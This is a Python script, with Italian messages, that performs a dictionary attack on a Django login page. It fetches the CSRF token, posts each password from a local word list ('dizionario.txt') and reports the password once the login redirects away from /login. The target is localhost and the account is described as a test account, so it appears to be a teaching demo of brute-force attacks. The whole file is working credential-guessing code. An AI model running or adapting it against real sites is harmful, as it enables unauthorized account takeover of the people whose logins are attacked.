import os
import time
import sys
import requests
from bs4 import BeautifulSoup


TARGET = "http://localhost:8000"
LOGIN_URL = TARGET + "/login/"

EMAIL = input("Email account di test: ")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DIZIONARIO_PATH = os.path.join(BASE_DIR, "dizionario.txt")

def get_csrf_token(session):
    try:
        r = session.get(LOGIN_URL, timeout=10)
    except requests.exceptions.RequestException:
        print("Errore: impossibile collegarsi al sito.")
        print("Controlla di aver avviato Django con: python manage.py runserver")
        sys.exit(1)

    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "csrfmiddlewaretoken"})

    if token:
        return token["value"]

    return None


def try_password(session, csrf_token, password):
    data = {
        "email": EMAIL,
        "password": password,
        "csrfmiddlewaretoken": csrf_token
    }

    try:
        r = session.post(LOGIN_URL, data=data, allow_redirects=True, timeout=10)
    except requests.exceptions.RequestException:
        print("Errore durante l'invio della richiesta di login.")
        return False

    if "/login" not in r.url:
        return True

    return False


if not os.path.exists(DIZIONARIO_PATH):
    print("--------------------------------")
    print("ERRORE: file dizionario non trovato.")
    print("Python sta cercando il file qui:")
    print(DIZIONARIO_PATH)
    print("--------------------------------")
    print("Controlla che nella cartella demo_attacco ci sia davvero un file chiamato:")
    print("dizionario.txt")
    sys.exit(1)


start = time.time()

session = requests.Session()
csrf_token = get_csrf_token(session)

if not csrf_token:
    print("Errore durante il recupero del token CSRF.")
    print("Controlla che la pagina /login/ contenga il form con {% csrf_token %}.")
    sys.exit(1)

print(f"Token CSRF recuperato: {csrf_token}")
print("Avvio attacco a dizionario...")
print(f"File dizionario usato: {DIZIONARIO_PATH}")
print("--------------------------------")

tentativi = 0

with open(DIZIONARIO_PATH, "r", encoding="utf-8", errors="ignore") as file:
    for riga in file:
        password = riga.strip()

        if not password:
            continue

        tentativi += 1

        print(f"Tentativo {tentativi}: provo '{password}'")

        if try_password(session, csrf_token, password):
            end = time.time()
            total = end - start

            print("--------------------------------")
            print("ATTACCO RIUSCITO")
            print(f"Email: {EMAIL}")
            print(f"Password trovata: {password}")
            print(f"Tentativi effettuati: {tentativi}")
            print(f"Tempo totale: {total:.2f} secondi")
            sys.exit(0)

print("--------------------------------")
print("ATTACCO FALLITO")
print("Password non trovata nel dizionario oppure account inesistente.")
sys.exit(1)